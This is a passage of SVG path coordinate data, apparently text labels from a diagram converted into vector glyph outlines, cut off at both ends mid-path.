-0.375 1.625 -0.375q1.234375 0 2.171875 0.640625q0.953125 0.625 1.4375 1.796875q0.484375 1.15625 0.484375 2.546875q0 1.484375 -0.53125 2.671875q-0.53125 1.1875 -1.546875 1.828125q-1.015625 0.625 -2.140625 0.625q-0.8125 0 -1.46875 -0.34375q-0.65625 -0.34375 -1.0625 -0.875l0 4.703125l-1.640625 0zm1.484375 -8.484375q0 1.859375 0.75 2.765625q0.765625 0.890625 1.828125 0.890625q1.09375 0 1.875 -0.921875q0.78125 -0.9375 0.78125 -2.875q0 -1.84375 -0.765625 -2.765625q-0.75 -0.921875 -1.8125 -0.921875q-1.046875 0 -1.859375 0.984375q-0.796875 0.96875 -0.796875 2.84375zm8.875717 4.78125l0 -9.671875l1.46875 0l0 1.46875q0.5625 -1.03125 1.03125 -1.359375q0.484375 -0.328125 1.0625 -0.328125q0.828125 0 1.6875 0.53125l-0.5625 1.515625q-0.609375 -0.359375 -1.203125 -0.359375q-0.546875 0 -0.96875 0.328125q-0.421875 0.328125 -0.609375 0.890625q-0.28125 0.875 -0.28125 1.921875l0 5.0625l-1.625 0zm5.618927 -4.84375q0 -2.6875 1.484375 -3.96875q1.25 -1.078125 3.046875 -1.078125q2.0 0 3.265625 1.3125q1.265625 1.296875 1.265625 3.609375q0 1.859375 -0.5625 2.9375q-0.5625 1.0625 -1.640625 1.65625q-1.0625 0.59375 -2.328125 0.59375q-2.03125 0 -3.28125 -1.296875q-1.25 -1.3125 -1.25 -3.765625zm1.6875 0q0 1.859375 0.796875 2.796875q0.8125 0.921875 2.046875 0.921875q1.21875 0 2.03125 -0.921875q0.8125 -0.9375 0.8125 -2.84375q0 -1.796875 -0.8125 -2.71875q-0.8125 -0.921875 -2.03125 -0.921875q-1.234375 0 -2.046875 0.921875q-0.796875 0.90625 -0.796875 2.765625zm15.610092 1.296875l1.609375 0.21875q-0.265625 1.65625 -1.359375 2.609375q-1.078125 0.9375 -2.671875 0.9375q-1.984375 0 -3.1875 -1.296875q-1.203125 -1.296875 -1.203125 -3.71875q0 -1.578125 0.515625 -2.75q0.515625 -1.171875 1.578125 -1.75q1.0625 -0.59375 2.3125 -0.59375q1.578125 0 2.578125 0.796875q1.0 0.796875 1.28125 2.265625l-1.59375 0.234375q-0.234375 -0.96875 -0.8125 -1.453125q-0.578125 -0.5 -1.390625 -0.5q-1.234375 0 -2.015625 0.890625q-0.78125 0.890625 -0.78125 2.8125q0 1.953125 0.75 2.84375q0.75 0.875 1.953125 0.875q0.96875 0 1.609375 -0.59375q0.65625 -0.59375 0.828125 -1.828125zm9.640625 0.4375l1.6875 0.203125q-0.40625 1.484375 -1.484375 2.3125q-1.078125 0.8125 -2.765625 0.8125q-2.125 0 -3.375 -1.296875q-1.234375 -1.3125 -1.234375 -3.671875q0 -2.453125 1.25 -3.796875q1.265625 -1.34375 3.265625 -1.34375q1.9375 0 3.15625 1.328125q1.234375 1.3125 1.234375 3.703125q0 0.15625 0 0.4375l-7.21875 0q0.09375 1.59375 0.90625 2.453125q0.8125 0.84375 2.015625 0.84375q0.90625 0 1.546875 -0.46875q0.640625 -0.484375 1.015625 -1.515625zm-5.390625 -2.65625l5.40625 0q-0.109375 -1.21875 -0.625 -1.828125q-0.78125 -0.953125 -2.03125 -0.953125q-1.125 0 -1.90625 0.765625q-0.765625 0.75 -0.84375 2.015625zm8.485092 2.875l1.625 -0.25q0.125 0.96875 0.75 1.5q0.625 0.515625 1.75 0.515625q1.125 0 1.671875 -0.453125q0.546875 -0.46875 0.546875 -1.09375q0 -0.546875 -0.484375 -0.875q-0.328125 -0.21875 -1.671875 -0.546875q-1.8125 -0.46875 -2.515625 -0.796875q-0.6875 -0.328125 -1.046875 -0.90625q-0.359375 -0.59375 -0.359375 -1.3125q0 -0.640625 0.296875 -1.1875q0.296875 -0.5625 0.8125 -0.921875q0.375 -0.28125 1.03125 -0.46875q0.671875 -0.203125 1.421875 -0.203125q1.140625 0 2.0 0.328125q0.859375 0.328125 1.265625 0.890625q0.421875 0.5625 0.578125 1.5l-1.609375 0.21875q-0.109375 -0.75 -0.640625 -1.171875q-0.515625 -0.421875 -1.46875 -0.421875q-1.140625 0 -1.625 0.375q-0.46875 0.375 -0.46875 0.875q0 0.3125 0.1875 0.578125q0.203125 0.265625 0.640625 0.4375q0.234375 0.09375 1.4375 0.421875q1.75 0.453125 2.4375 0.75q0.6875 0.296875 1.078125 0.859375q0.390625 0.5625 0.390625 1.40625q0 0.828125 -0.484375 1.546875q-0.46875 0.71875 -1.375 1.125q-0.90625 0.390625 -2.046875 0.390625q-1.875 0 -2.875 -0.78125q-0.984375 -0.78125 -1.25 -2.328125zm9.328125 0l1.625 -0.25q0.125 0.96875 0.75 1.5q0.625 0.515625 1.75 0.515625q1.125 0 1.671875 -0.453125q0.546875 -0.46875 0.546875 -1.09375q0 -0.546875 -0.484375 -0.875q-0.328125 -0.21875 -1.671875 -0.546875q-1.8125 -0.46875 -2.515625 -0.796875q-0.6875 -0.328125 -1.046875 -0.90625q-0.359375 -0.59375 -0.359375 -1.3125q0 -0.640625 0.296875 -1.1875q0.296875 -0.5625 0.8125 -0.921875q0.375 -0.28125 1.03125 -0.46875q0.671875 -0.203125 1.421875 -0.203125q1.140625 0 2.0 0.328125q0.859375 0.328125 1.265625 0.890625q0.421875 0.5625 0.578125 1.5l-1.609375 0.21875q-0.109375 -0.75 -0.640625 -1.171875q-0.515625 -0.421875 -1.46875 -0.421875q-1.140625 0 -1.625 0.375q-0.46875 0.375 -0.46875 0.875q0 0.3125 0.1875 0.578125q0.203125 0.265625 0.640625 0.4375q0.234375 0.09375 1.4375 0.421875q1.75 0.453125 2.4375 0.75q0.6875 0.296875 1.078125 0.859375q0.390625 0.5625 0.390625 1.40625q0 0.828125 -0.484375 1.546875q-0.46875 0.71875 -1.375 1.125q-0.90625 0.390625 -2.046875 0.390625q-1.875 0 -2.875 -0.78125q-0.984375 -0.78125 -1.25 -2.328125zm8.46875 6.59375l0 -1.1875l10.859375 0l0 1.1875l-10.859375 0zm15.469467 -5.171875l0.234375 1.453125q-0.6875 0.140625 -1.234375 0.140625q-0.890625 0 -1.390625 -0.28125q-0.484375 -0.28125 -0.6875 -0.734375q-0.203125 -0.46875 -0.203125 -1.9375l0 -5.578125l-1.203125 0l0 -1.265625l1.203125 0l0 -2.390625l1.625 -0.984375l0 3.375l1.65625 0l0 1.265625l-1.65625 0l0 5.671875q0 0.6875 0.078125 0.890625q0.09375 0.203125 0.28125 0.328125q0.203125 0.109375 0.578125 0.109375q0.265625 0 0.71875 -0.0625zm1.5895538 1.46875l0 -9.671875l1.46875 0l0 1.46875q0.5625 -1.03125 1.03125 -1.359375q0.484375 -0.328125 1.0625 -0.328125q0.828125 0 1.6875 0.53125l-0.5625 1.515625q-0.609375 -0.359375 -1.203125 -0.359375q-0.546875 0 -0.96875 0.328125q-0.421875 0.328125 -0.609375 0.890625q-0.28125 0.875 -0.28125 1.921875l0 5.0625l-1.625 0zm12.540802 -1.1875q-0.921875 0.765625 -1.765625 1.09375q-0.828125 0.3125 -1.796875 0.3125q-1.59375 0 -2.453125 -0.78125q-0.859375 -0.78125 -0.859375 -1.984375q0 -0.71875 0.328125 -1.296875q0.328125 -0.59375 0.84375 -0.9375q0.53125 -0.359375 1.1875 -0.546875q0.46875 -0.125 1.453125 -0.25q1.984375 -0.234375 2.921875 -0.5625q0.015625 -0.34375 0.015625 -0.421875q0 -1.0 -0.46875 -1.421875q-0.625 -0.546875 -1.875 -0.546875q-1.15625 0 -1.703125 0.40625q-0.546875 0.40625 -0.8125 1.421875l-1.609375 -0.21875q0.21875 -1.015625 0.71875 -1.640625q0.5 -0.640625 1.453125 -0.984375q0.953125 -0.34375 2.1875 -0.34375q1.25 0 2.015625 0.296875q0.78125 0.28125 1.140625 0.734375q0.375 0.4375 0.515625 1.109375q0.078125 0.421875 0.078125 1.515625l0 2.1875q0 2.28125 0.109375 2.890625q0.109375 0.59375 0.40625 1.15625l-1.703125 0q-0.265625 -0.515625 -0.328125 -1.1875zm-0.140625 -3.671875q-0.890625 0.375 -2.671875 0.625q-1.015625 0.140625 -1.4375 0.328125q-0.421875 0.1875 -0.65625 0.53125q-0.21875 0.34375 -0.21875 0.78125q0 0.65625 0.5 1.09375q0.5 0.4375 1.453125 0.4375q0.9375 0 1.671875 -0.40625q0.75 -0.421875 1.09375 -1.140625q0.265625 -0.5625 0.265625 -1.640625l0 -0.609375zm10.516357 1.3125l1.609375 0.21875q-0.265625 1.65625 -1.359375 2.609375q-1.078125 0.9375 -2.671875 0.9375q-1.984375 0 -3.1875 -1.296875q-1.203125 -1.296875 -1.203125 -3.71875q0 -1.578125 0.515625 -2.75q0.515625 -1.171875 1.578125 -1.75q1.0625 -0.59375 2.3125 -0.59375q1.578125 0 2.578125 0.796875q1.0 0.796875 1.28125 2.265625l-1.59375 0.234375q-0.234375 -0.96875 -0.8125 -1.453125q-0.578125 -0.5 -1.390625 -0.5q-1.234375 0 -2.015625 0.890625q-0.78125 0.890625 -0.78125 2.8125q0 1.953125 0.75 2.84375q0.75 0.875 1.953125 0.875q0.96875 0 1.609375 -0.59375q0.65625 -0.59375 0.828125 -1.828125zm3.015625 3.546875l0 -13.359375l1.640625 0l0 7.625l3.890625 -3.9375l2.109375 0l-3.6875 3.59375l4.0625 6.078125l-2.015625 0l-3.203125 -4.953125l-1.15625 1.125l0 3.828125l-1.640625 0zm15.953125 -3.109375l1.6875 0.203125q-0.40625 1.484375 -1.484375 2.3125q-1.078125 0.8125 -2.765625 0.8125q-2.125 0 -3.375 -1.296875q-1.234375 -1.3125 -1.234375 -3.671875q0 -2.453125 1.25 -3.796875q1.265625 -1.34375 3.265625 -1.34375q1.9375 0 3.15625 1.328125q1.234375 1.3125 1.234375 3.703125q0 0.15625 0 0.4375l-7.21875 0q0.09375 1.59375 0.90625 2.453125q0.8125 0.84375 2.015625 0.84375q0.90625 0 1.546875 -0.46875q0.640625 -0.484375 1.015625 -1.515625zm-5.390625 -2.65625l5.40625 0q-0.109375 -1.21875 -0.625 -1.828125q-0.78125 -0.953125 -2.03125 -0.953125q-1.125 0 -1.90625 0.765625q-0.765625 0.75 -0.84375 2.015625zm9.125702 5.765625l0 -9.671875l1.46875 0l0 1.46875q0.5625 -1.03125 1.03125 -1.359375q0.484375 -0.328125 1.0625 -0.328125q0.828125 0 1.6875 0.53125l-0.5625 1.515625q-0.609375 -0.359375 -1.203125 -0.359375q-0.546875 0 -0.96875 0.328125q-0.421875 0.328125 -0.609375 0.890625q-0.28125 0.875 -0.28125 1.921875l0 5.0625l-1.625 0zm4.712677 3.703125l0 -1.1875l10.859375 0l0 1.1875l-10.859375 0zm11.891357 0l0 -13.375l1.484375 0l0 1.25q0.53125 -0.734375 1.1875 -1.09375q0.671875 -0.375 1.625 -0.375q1.234375 0 2.171875 0.640625q0.953125 0.625 1.4375 1.796875q0.484375 1.15625 0.484375 2.546875q0 1.484375 -0.53125 2.671875q-0.53125 1.1875 -1.546875 1.828125q-1.015625 0.625 -2.140625 0.625q-0.8125 0 -1.46875 -0.34375q-0.65625 -0.34375 -1.0625 -0.875l0 4.703125l-1.640625 0zm1.484375 -8.484375q0 1.859375 0.75 2.765625q0.765625 0.890625 1.828125 0.890625q1.09375 0 1.875 -0.921875q0.78125 -0.9375 0.78125 -2.875q0 -1.84375 -0.765625 -2.765625q-0.75 -0.921875 -1.8125 -0.921875q-1.046875 0 -1.859375 0.984375q-0.796875 0.96875 -0.796875 2.84375zm8.235077 1.890625l1.625 -0.25q0.125 0.96875 0.75 1.5q0.625 0.515625 1.75 0.515625q1.125 0 1.671875 -0.453125q0.546875 -0.46875 0.546875 -1.09375q0 -0.546875 -0.484375 -0.875q-0.328125 -0.21875 -1.671875 -0.546875q-1.8125 -0.46875 -2.515625 -0.796875q-0.6875 -0.328125 -1.046875 -0.90625q-0.359375 -0.59375 -0.359375 -1.3125q0 -0.640625 0.296875 -1.1875q0.296875 -0.5625 0.8125 -0.921875q0.375 -0.28125 1.03125 -0.46875q0.671875 -0.203125 1.421875 -0.203125q1.140625 0 2.0 0.328125q0.859375 0.328125 1.265625 0.890625q0.421875 0.5625 0.578125 1.5l-1.609375 0.21875q-0.109375 -0.75 -0.640625 -1.171875q-0.515625 -0.421875 -1.46875 -0.421875q-1.140625 0 -1.625 0.375q-0.46875 0.375 -0.46875 0.875q0 0.3125 0.1875 0.578125q0.203125 0.265625 0.640625 0.4375q0.234375 0.09375 1.4375 0.421875q1.75 0.453125 2.4375 0.75q0.6875 0.296875 1.078125 0.859375q0.390625 0.5625 0.390625 1.40625q0 0.828125 -0.484375 1.546875q-0.46875 0.71875 -1.375 1.125q-0.90625 0.390625 -2.046875 0.390625q-1.875 0 -2.875 -0.78125q-0.984375 -0.78125 -1.25 -2.328125zm9.9375 2.890625l0 -13.359375l1.640625 0l0 13.359375l-1.640625 0zm4.1917114 -11.46875l0 -1.890625l1.640625 0l0 1.890625l-1.640625 0zm0 11.46875l0 -9.671875l1.640625 0l0 9.671875l-1.640625 0zm3.488556 -2.890625l1.625 -0.25q0.125 0.96875 0.75 1.5q0.625 0.515625 1.75 0.515625q1.125 0 1.671875 -0.453125q0.546875 -0.46875 0.546875 -1.09375q0 -0.546875 -0.484375 -0.875q-0.328125 -0.21875 -1.671875 -0.546875q-1.8125 -0.46875 -2.515625 -0.796875q-0.6875 -0.328125 -1.046875 -0.90625q-0.359375 -0.59375 -0.359375 -1.3125q0 -0.640625 0.296875 -1.1875q0.296875 -0.5625 0.8125 -0.921875q0.375 -0.28125 1.03125 -0.46875q0.671875 -0.203125 1.421875 -0.203125q1.140625 0 2.0 0.328125q0.859375 0.328125 1.265625 0.890625q0.421875 0.5625 0.578125 1.5l-1.609375 0.21875q-0.109375 -0.75 -0.640625 -1.171875q-0.515625 -0.421875 -1.46875 -0.421875q-1.140625 0 -1.625 0.375q-0.46875 0.375 -0.46875 0.875q0 0.3125 0.1875 0.578125q0.203125 0.265625 0.640625 0.4375q0.234375 0.09375 1.4375 0.421875q1.75 0.453125 2.4375 0.75q0.6875 0.296875 1.078125 0.859375q0.390625 0.5625 0.390625 1.40625q0 0.828125 -0.484375 1.546875q-0.46875 0.71875 -1.375 1.125q-0.90625 0.390625 -2.046875 0.390625q-1.875 0 -2.875 -0.78125q-0.984375 -0.78125 -1.25 -2.328125zm13.5625 1.421875l0.234375 1.453125q-0.6875 0.140625 -1.234375 0.140625q-0.890625 0 -1.390625 -0.28125q-0.484375 -0.28125 -0.6875 -0.734375q-0.203125 -0.46875 -0.203125 -1.9375l0 -5.578125l-1.203125 0l0 -1.265625l1.203125 0l0 -2.390625l1.625 -0.984375l0 3.375l1.65625 0l0 1.265625l-1.65625 0l0 5.671875q0 0.6875 0.078125 0.890625q0.09375 0.203125 0.28125 0.328125q0.203125 0.109375 0.578125 0.109375q0.265625 0 0.71875 -0.0625zm4.730194 5.390625q-1.359375 -1.703125 -2.296875 -4.0q-0.9375 -2.296875 -0.9375 -4.765625q0 -2.15625 0.703125 -4.140625q0.828125 -2.3125 2.53125 -4.59375l1.171875 0q-1.09375 1.890625 -1.453125 2.703125q-0.546875 1.25 -0.875 2.625q-0.390625 1.703125 -0.390625 3.421875q0 4.375 2.71875 8.75l-1.171875 0zm4.165802 0l-1.1875 0q2.734375 -4.375 2.734375 -8.75q0 -1.71875 -0.390625 -3.390625q-0.3125 -1.375 -0.875 -2.625q-0.359375 -0.828125 -1.46875 -2.734375l1.1875 0q1.703125 2.28125 2.53125 4.59375q0.6875 1.984375 0.6875 4.140625q0 2.46875 -0.9375 4.765625q-0.9375 2.296875 -2.28125 4.0z" fill-rule="nonzero"/>&lt;path fill="#000000" d="m176.06902 607.63727l0 -13.375l1.484375 0l0 1.25q0.53125 -0.734375 1.1875 -1.09375q0.671875 -0.375 1.625 -0.375q1.234375 0 2.171875 0.640625q0.953125 0.625 1.4375 1.796875q0.484375 1.15625 0.484375 2.546875q0 1.484375 -0.53125 2.671875q-0.53125 1.1875 -1.546875 1.828125q-1.015625 0.625 -2.140625 0.625q-0.8125 0 -1.46875 -0.34375q-0.65625 -0.34375 -1.0625 -0.875l0 4.703125l-1.640625 0zm1.484375 -8.484375q0 1.859375 0.75 2.765625q0.765625 0.890625 1.828125 0.890625q1.09375 0 1.875 -0.921875q0.78125 -0.9375 0.78125 -2.875q0 -1.84375 -0.765625 -2.765625q-0.75 -0.921875 -1.8125 -0.921875q-1.046875 0 -1.859375 0.984375q-0.796875 0.96875 -0.796875 2.84375zm8.875717 4.78125l0 -9.671875l1.46875 0l0 1.46875q0.5625 -1.03125 1.03125 -1.359375q0.484375 -0.328125 1.0625 -0.328125q0.828125 0 1.6875 0.53125l-0.5625 1.515625q-0.609375 -0.359375 -1.203125 -0.359375q-0.546875 0 -0.96875 0.328125q-0.421875 0.328125 -0.609375 0.890625q-0.28125 0.875 -0.28125 1.921875l0 5.0625l-1.625 0zm5.618927 -4.84375q0 -2.6875 1.484375 -3.96875q1.25 -1.078125 3.046875 -1.078125q2.0 0 3.265625 1.3125q1.265625 1.296875 1.265625 3.609375q0 1.859375 -0.5625 2.9375q-0.5625 1.0625 -1.640625 1.65625q-1.0625 0.59375 -2.328125 0.59375q-2.03125 0 -3.28125 -1.296875q-1.25 -1.3125 -1.25 -3.765625zm1.6875 0q0 1.859375 0.796875 2.796875q0.8125 0.921875 2.046875 0.921875q1.21875 0 2.03125 -0.921875q0.8125 -0.9375 0.8125 -2.84375q0 -1.796875 -0.8125 -2.71875q-0.8125 -0.921875 -2.03125 -0.921875q-1.234375 0 -2.046875 0.921875q-0.796875 0.90625 -0.796875 2.765625zm15.610092 1.296875l1.609375 0.21875q-0.265625 1.65625 -1.359375 2.609375q-1.078125 0.9375 -2.671875 0.9375q-1.984375 0 -3.1875 -1.296875q-1.203125 -1.296875 -1.203125 -3.71875q0 -1.578125 0.515625 -2.75q0.515625 -1.171875 1.578125 -1.75q1.0625 -0.59375 2.3125 -0.59375q1.578125 0 2.578125 0.796875q1.0 0.796875 1.28125 2.265625l-1.59375 0.234375q-0.234375 -0.96875 -0.8125 -1.453125q-0.578125 -0.5 -1.390625 -0.5q-1.234375 0 -2.015625 0.890625q-0.78125 0.890625 -0.78125 2.8125q0 1.953125 0.75 2.84375q0.75 0.875 1.953125 0.875q0.96875 0 1.609375 -0.59375q0.65625 -0.59375 0.828125 -1.828125zm9.640625 0.4375l1.6875 0.203125q-0.40625 1.484375 -1.484375 2.3125q-1.078125 0.8125 -2.765625 0.8125q-2.125 0 -3.375 -1.296875q-1.234375 -1.3125 -1.234375 -3.671875q0 -2.453125 1.25 -3.796875q1.265625 -1.34375 3.265625 -1.34375q1.9375 0 3.15625 1.328125q1.234375 1.3125 1.234375 3.703125q0 0.15625 0 0.4375l-7.21875 0q0.09375 1.59375 0.90625 2.453125q0.8125 0.84375 2.015625 0.84375q0.90625 0 1.546875 -0.46875q0.640625 -0.484375 1.015625 -1.515625zm-5.390625 -2.65625l5.40625 0q-0.109375 -1.21875 -0.625 -1.828125q-0.78125 -0.953125 -2.03125 -0.953125q-1.125 0 -1.90625 0.765625q-0.765625 0.75 -0.84375 2.015625zm8.485092 2.875l1.625 -0.25q0.125 0.96875 0.75 1.5q0.625 0.515625 1.75 0.515625q1.125 0 1.671875 -0.453125q0.546875 -0.46875 0.546875 -1.09375q0 -0.546875 -0.484375 -0.875q-0.328125 -0.21875 -1.671875 -0.546875q-1.8125 -0.46875 -2.515625 -0.796875q-0.6875 -0.328125 -1.046875 -0.90625q-0.359375 -0.59375 -0.359375 -1.3125q0 -0.640625 0.296875 -1.1875q0.296875 -0.5625 0.8125 -0.921875q0.375 -0.28125 1.03125 -0.46875q0.671875 -0.203125 1.421875 -0.203125q1.140625 0 2.0 0.328125q0.859375 0.328125 1.265625 0.890625q0.421875 0.5625 0.578125 1.5l-1.609375 0.21875q-0.109375 -0.75 -0.640625 -1.171875q-0.515625 -0.421875 -1.46875 -0.421875q-1.140625 0 -1.625 0.375q-0.46875 0.375 -0.46875 0.875q0 0.3125 0.1875 0.578125q0.203125 0.265625 0.640625 0.4375q0.234375 0.09375 1.4375 0.421875q1.75 0.453125 2.4375 0.75q0.6875 0.296875 1.078125 0.859375q0.390625 0.5625 0.390625 1.40625q0 0.828125 -0.484375 1.546875q-0.46875 0.71875 -1.375 1.125q-0.90625 0.390625 -2.046875 0.390625q-1.875 0 -2.875 -0.78125q-0.984375 -0.78125 -1.25 -2.328125zm9.328125 0l1.625 -0.25q0.125 0.96875 0.75 1.5q0.625 0.515625 1.75 0.515625q1.125 0 1.671875 -0.453125q0.546875 -0.46875 0.546875 -1.09375q0 -0.546875 -0.484375 -0.875q-0.328125 -0.21875 -1.671875 -0.546875q-1.8125 -0.46875 -2.515625 -0.796875q-0.6875 -0.328125 -1.046875 -0.90625q-0.359375 -0.59375 -0.359375 -1.3125q0 -0.640625 0.296875 -1.1875q0.296875 -0.5625 0.8125 -0.921875q0.375 -0.28125 1.03125 -0.46875q0.671875 -0.203125 1.421875 -0.203125q1.140625 0 2.0 0.328125q0.859375 0.328125 1.265625 0.890625q0.421875 0.5625 0.578125 1.5l-1.609375 0.21875q-0.109375 -0.75 -0.640625 -1.171875q-0.515625 -0.421875 -1.46875 -0.421875q-1.140625 0 -1.625 0.375q-0.46875 0.375 -0.46875 0.875q0 0.3125 0.1875 0.578125q0.203125 0.265625 0.640625 0.4375q0.234375 0.09375 1.4375 0.421875q1.75 0.453125 2.4375 0.75q0.6875 0.296875 1.078125 0.859375q0.390625 0.5625 0.390625 1.40625q0 0.828125 -0.484375 1.546875q-0.46875 0.71875 -1.375 1.125q-0.90625 0.390625 -2.046875 0.390625q-1.875 0 -2.875 -0.78125q-0.984375 -0.78125 -1.25 -2.328125zm8.46875 6.59375l0 -1.1875l10.859375 0l0 1.1875l-10.859375 0zm15.469467 -5.171875l0.234375 1.453125q-0.6875 0.140625 -1.234375 0.140625q-0.890625 0 -1.390625 -0.28125q-0.484375 -0.28125 -0.6875 -0.734375q-0.203125 -0.46875 -0.203125 -1.9375l0 -5.578125l-1.203125 0l0 -1.265625l1.203125 0l0 -2.390625l1.625 -0.984375l0 3.375l1.65625 0l0 1.265625l-1.65625 0l0 5.671875q0 0.6875 0.078125 0.890625q0.09375 0.203125 0.28125 0.328125q0.203125 0.109375 0.578125 0.109375q0.265625 0 0.71875 -0.0625zm1.5895538 1.46875l0 -9.671875l1.46875 0l0 1.46875q0.5625 -1.03125 1.03125 -1.359375q0.484375 -0.328125 1.0625 -0.328125q0.828125 0 1.6875 0.53125l-0.5625 1.515625q-0.609375 -0.359375 -1.203125 -0.359375q-0.546875 0 -0.96875 0.328125q-0.421875 0.328125 -0.609375 0.890625q-0.28125 0.875 -0.28125 1.921875l0 5.0625l-1.625 0zm12.540802 -1.1875q-0.921875 0.765625 -1.765625 1.09375q-0.828125 0.3125 -1.796875 0.3125q-1.59375 0 -2.453125 -0.78125q-0.859375 -0.78125 -0.859375 -1.984375q0 -0.71875 0.328125 -1.296875q0.328125 -0.59375 0.84375 -0.9375q0.53125 -0.359375 1.1875 -0.546875q0.46875 -0.125 1.453125 -0.25q1.984375 -0.234375 2.921875 -0.5625q0.015625 -0.34375 0.015625 -0.421875q0 -1.0 -0.46875 -1.421875q-0.625 -0.546875 -1.875 -0.546875q-1.15625 0 -1.703125 0.40625q-0.546875 0.40625 -0.8125 1.421875l-1.609375 -0.21875q0.21875 -1.015625 0.71875 -1.640625q0.5 -0.640625 1.453125 -0.984375q0.953125 -0.34375 2.1875 -0.34375q1.25 0 2.015625 0.296875q0.78125 0.28125 1.140625 0.734375q0.375 0.4375 0.515625 1.109375q0.078125 0.421875 0.078125 1.515625l0 2.1875q0 2.28125 0.109375 2.890625q0.109375 0.59375 0.40625 1.15625l-1.703125 0q-0.265625 -0.515625 -0.328125 -1.1875zm-0.140625 -3.671875q-0.890625 0.375 -2.671875 0.625q-1.015625 0.140625 -1.4375 0.328125q-0.421875 0.1875 -0.65625 0.53125q-0.21875 0.34375 -0.21875 0.78125q0 0.65625 0.5 1.09375q0.5 0.4375 1.453125 0.4375q0.9375 0 1.671875 -0.40625q0.75 -0.421875 1.09375 -1.140625q0.265625 -0.5625 0.265625 -1.640625l0 -0.609375zm10.516357 1.3125l1.609375 0.21875q-0.265625 1.65625 -1.359375 2.609375q-1.078125 0.9375 -2.671875 0.9375q-1.984375 0 -3.1875 -1.296875q-1.203125 -1.296875 -1.203125 -3.71875q0 -1.578125 0.515625 -2.75q0.515625 -1.171875 1.578125 -1.75q1.0625 -0.59375 2.3125 -0.59375q1.578125 0 2.578125 0.796875q1.0 0.796875 1.28125 2.265625l-1.59375 0.234375q-0.234375 -0.96875 -0.8125 -1.453125q-0.578125 -0.5 -1.390625 -0.5q-1.234375 0 -2.015625 0.890625q-0.78125 0.890625 -0.78125 2.8125q0 1.953125 0.75 2.84375q0.75 0.875 1.953125 0.875q0.96875 0 1.609375 -0.59375q0.65625 -0.59375 0.828125 -1.828125zm3.015625 3.546875l0 -13.359375l1.640625 0l0 7.625l3.890625 -3.9375l2.109375 0l-3.6875 3.59375l4.0625 6.078125l-2.015625 0l-3.203125 -4.953125l-1.15625 1.125l0 3.828125l-1.640625 0zm15.953125 -3.109375l1.6875 0.203125q-0.40625 1.484375 -1.484375 2.3125q-1.078125 0.8125 -2.765625 0.8125q-2.125 0 -3.375 -1.296875q-1.234375 -1.3125 -1.234375 -3.671875q0 -2.453125 1.25 -3.796875q1.265625 -1.34375 3.265625 -1.34375q1.9375 0 3.15625 1.328125q1.234375 1.3125 1.234375 3.703125q0 0.15625 0 0.4375l-7.21875 0q0.09375 1.59375 0.90625 2.453125q0.8125 0.84375 2.015625 0.84375q0.90625 0 1.546875 -0.46875q0.640625 -0.484375 1.015625 -1.515625zm-5.390625 -2.65625l5.40625 0q-0.109375 -1.21875 -0.625 -1.828125q-0.78125 -0.953125 -2.03125 -0.953125q-1.125 0 -1.90625 0.765625q-0.765625 0.75 -0.84375 2.015625zm9.125702 5.765625l0 -9.671875l1.46875 0l0 1.46875q0.5625 -1.03125 1.03125 -1.359375q0.484375 -0.328125 1.0625 -0.328125q0.828125 0 1.6875 0.53125l-0.5625 1.515625q-0.609375 -0.359375 -1.203125 -0.359375q-0.546875 0 -0.96875 0.328125q-0.421875 0.328125 -0.609375 0.890625q-0.28125 0.875 -0.28125 1.921875l0 5.0625l-1.625 0zm4.712677 3.703125l0 -1.1875l10.859375 0l0 1.1875l-10.859375 0zm18.203857 -7.25l1.609375 0.21875q-0.265625 1.65625 -1.359375 2.609375q-1.078125 0.9375 -2.671875 0.9375q-1.984375 0 -3.1875 -1.296875q-1.203125 -1.296875 -1.203125 -3.71875q0 -1.578125 0.515625 -2.75q0.515625 -1.171875 1.578125 -1.75q1.0625 -0.59375 2.3125 -0.59375q1.578125 0 2.578125 0.796875q1.0 0.796875 1.28125 2.265625l-1.59375 0.234375q-0.234375 -0.96875 -0.8125 -1.453125q-0.578125 -0.5 -1.390625 -0.5q-1.234375 0 -2.015625 0.890625q-0.78125 0.890625 -0.78125 2.8125q0 1.953125 0.75 2.84375q0.75 0.875 1.953125 0.875q0.96875 0 1.609375 -0.59375q0.65625 -0.59375 0.828125 -1.828125zm9.328125 2.359375q-0.921875 0.765625 -1.765625 1.09375q-0.828125 0.3125 -1.796875 0.3125q-1.59375 0 -2.453125 -0.78125q-0.859375 -0.78125 -0.859375 -1.984375q0 -0.71875 0.328125 -1.296875q0.328125 -0.59375 0.84375 -0.9375q0.53125 -0.359375 1.1875 -0.546875q0.46875 -0.125 1.453125 -0.25q1.984375 -0.234375 2.921875 -0.5625q0.015625 -0.34375 0.015625 -0.421875q0 -1.0 -0.46875 -1.421875q-0.625 -0.546875 -1.875 -0.546875q-1.15625 0 -1.703125 0.40625q-0.546875 0.40625 -0.8125 1.421875l-1.609375 -0.21875q0.21875 -1.015625 0.71875 -1.640625q0.5 -0.640625 1.453125 -0.984375q0.953125 -0.34375 2.1875 -0.34375q1.25 0 2.015625 0.296875q0.78125 0.28125 1.140625 0.734375q0.375 0.4375 0.515625 1.109375q0.078125 0.421875 0.078125 1.515625l0 2.1875q0 2.28125 0.109375 2.890625q0.109375 0.59375 0.40625 1.15625l-1.703125 0q-0.265625 -0.515625 -0.328125 -1.1875zm-0.140625 -3.671875q-0.890625 0.375 -2.671875 0.625q-1.015625 0.140625 -1.4375 0.328125q-0.421875 0.1875 -0.65625 0.53125q-0.21875 0.34375 -0.21875 0.78125q0 0.65625 0.5 1.09375q0.5 0.4375 1.453125 0.4375q0.9375 0 1.671875 -0.40625q0.75 -0.421875 1.09375 -1.140625q0.265625 -0.5625 0.265625 -1.640625l0 -0.609375zm4.156952 4.859375l0 -13.359375l1.640625 0l0 13.359375l-1.640625 0zm4.1448364 0l0 -13.359375l1.640625 0l0 13.359375l-1.640625 0zm10.504181 -3.546875l1.609375 0.21875q-0.265625 1.65625 -1.359375 2.609375q-1.078125 0.9375 -2.671875 0.9375q-1.984375 0 -3.1875 -1.296875q-1.203125 -1.296875 -1.203125 -3.71875q0 -1.578125 0.515625 -2.75q0.515625 -1.171875 1.578125 -1.75q1.0625 -0.59375 2.3125 -0.59375q1.578125 0 2.578125 0.796875q1.0 0.796875 1.28125 2.265625l-1.59375 0.234375q-0.234375 -0.96875 -0.8125 -1.453125q-0.578125 -0.5 -1.390625 -0.5q-1.234375 0 -2.015625 0.890625q-0.78125 0.890625 -0.78125 2.8125q0 1.953125 0.75 2.84375q0.75 0.875 1.953125 0.875q0.96875 0 1.609375 -0.59375q0.65625 -0.59375 0.828125 -1.828125zm3.015625 3.546875l0 -13.359375l1.640625 0l0 4.796875q1.140625 